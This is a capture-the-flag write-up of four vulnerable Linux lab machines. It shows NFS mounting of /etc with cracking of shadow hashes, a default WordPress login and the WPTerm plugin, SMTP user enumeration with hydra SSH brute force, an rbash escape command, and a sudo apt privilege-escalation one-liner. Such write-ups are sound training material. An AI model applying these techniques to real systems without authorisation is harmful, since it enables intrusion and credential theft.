## Lab Overview :

Braavos is a network of vulnerable Linux servers. Each box suffer from vulnerabilities that could grant you code execution on the system and get you the required flags. You will need to fully enumerate each target, search for attack vectors and bypass restrictions if needed.

- Number of Machines : 4
### Machine 1: Crippled

As always, we started by scanning the ports using `Nmap` :
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac60e7074867ddda75512c2d078a9d40 (RSA)
|   256 e8cfdb6f1989de64ba2b5e75f9956180 (ECDSA)
|_  256 62678301d4cb7b918270b62db05c88fe (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      43917/tcp   mountd
|   100005  1,2,3      44757/tcp6  mountd
|   100005  1,2,3      51256/udp6  mountd
|   100005  1,2,3      56953/udp   mountd
|   100021  1,3,4      32933/udp6  nlockmgr
|   100021  1,3,4      36639/tcp   nlockmgr
|   100021  1,3,4      42709/tcp6  nlockmgr
|   100021  1,3,4      60840/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
```
We can see that the NFS port is open, we can check about mount that machine has with 
`showmount` command :

![](./imgs/Pasted%20image%2020230515112417.png)

`/etc` is available to mount with, so we use `mount` and we got `/etc`.

![](./imgs/Pasted%20image%2020230515112825.png)

after a little bit of search, we have two files `shadow.bak` and `passwd.bak` we have a read permission to these files, after `unshadow` those files we can see that we have a user `nagios` and his hash :

![](./imgs/Pasted%20image%2020230515115319.png)

using the default word list of `john` :

![](./imgs/Pasted%20image%2020230515115421.png)

we got our password successfully we can now log in to ssh with `nagios` user.
Using `sudo -l` we  can see that the user have right to execute a script using sudo :

![](./imgs/Pasted%20image%2020230515115905.png)

so our way is to create to empty directories inside `scripts` and create a `setup.sh` script with `/bin/bash` inside it.

![](./imgs/Pasted%20image%2020230515130538.png)

we got the flag successfully.

### Machine 2: Lazy

`nmap` result:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e32c4ef9d55a74c7e371a17f5a7f4901 (RSA)
|   256 0b152b1a1e293e9e3054f07179f9b272 (ECDSA)
|_  256 c7a54596bda59a2f78426357bb62056b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.5.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: staging1 &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have WordPress running on Apache server, website overview:

![](./imgs/Pasted%20image%2020230515131430.png)

we have a login page: 

![](./imgs/Pasted%20image%2020230515131527.png)

first thing we tried to log in using old school admin admin, and we logged in successfully:

![](./imgs/Pasted%20image%2020230515131750.png)

on plugins page there is one plugin `WPTerm`, Just like a terminal, `WPTerm` lets you do almost everything you want (e.g., changing file permissions, viewing network connections or current processes etc.).
Terminal overview:

![](./imgs/Pasted%20image%2020230515132151.png)

in `/home/uadmin` we can get the private key to log with ssh:

![](./imgs/Pasted%20image%2020230515132627.png)

using `sudo -l` we can see that we have right to run anything with sudo:

![](./imgs/Pasted%20image%2020230515132924.png)

easy `sudo su` and we're in:

![](./imgs/Pasted%20image%2020230515133027.png)

and we got the flag.

### Machine 3: Gate
`nmap` result:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d342cf56a7269c9b8a82d744a36e380 (RSA)
|   256 eeb71de81b8f2baaf3171941a372bca4 (ECDSA)
|_  256 464b6efe13aeae474c44fc79a4dcf9f8 (ED25519)
25/tcp open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=ip-192-168-168-188.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-192-168-168-188.eu-west-1.compute.internal
| Not valid before: 2020-10-31T15:49:58
|_Not valid after:  2030-10-29T15:49:58
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: dev01, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
Service Info: Host:  dev01; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
`smtp` Running on port 25 and in allowed command, there is `VRFY` it used to check an email address if it exists, we can use that to enumerate the users.
Using `smtp-user-enum` and `seclist top usernames` word list, we got two users `root` and `adm` :
```bash
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Target count ............. 1
Username count ........... 17
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Mon May 15 13:56:24 2023 #########
10.8.0.4: root exists
10.8.0.4: adm exists
######## Scan completed at Mon May 15 13:56:25 2023 #########
2 results.

17 queries in 1 seconds (17.0 queries / sec)
```
Now we have to brute force the ssh to get the right password for `adm` user.
Using `hydra` we got the password:

![](./imgs/Pasted%20image%2020230515141343.png)

then we have access to the user in `ssh`, after we logged in we found out that the machine uses `rbash` and it restricts us from the normal commands, so we need to bypass it, we can use the following command along ssh to break the jail and bypass the `rbash` by accessing proper bash shell: 
```bash
ssh adm@IP -t "bash --noprofile"
```
By checking `sudo -l` `adm` user can run any command using sudo, we logged to root using `sudo su`, and we got the flag easily.

### Machine 4: Disclosed

`nmap` result:
```bash
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1607635545f12c5932b11c405249775d (RSA)
|   256 b7e769e4551d643a4fd4787dd99a438c (ECDSA)
|_  256 ec4a9697fa867bafb1f76fcee74de690 (ED25519)
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Using `nmap` we can enumerate `ldap` using `ldap-search` script, in result we got some users and their passwords:

![](./imgs/Pasted%20image%2020230515163145.png)

we can crack admmark password using `john` :

![](./imgs/Pasted%20image%2020230515163313.png)

with `sudo -l` we can see that the user allowed to run `apt` using `sudo` :

![](./imgs/Pasted%20image%2020230515163549.png)

we can do a privesc here in `GTFObins` we can see that using
```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

![](./imgs/Pasted%20image%2020230515163934.png)

and we got our flag.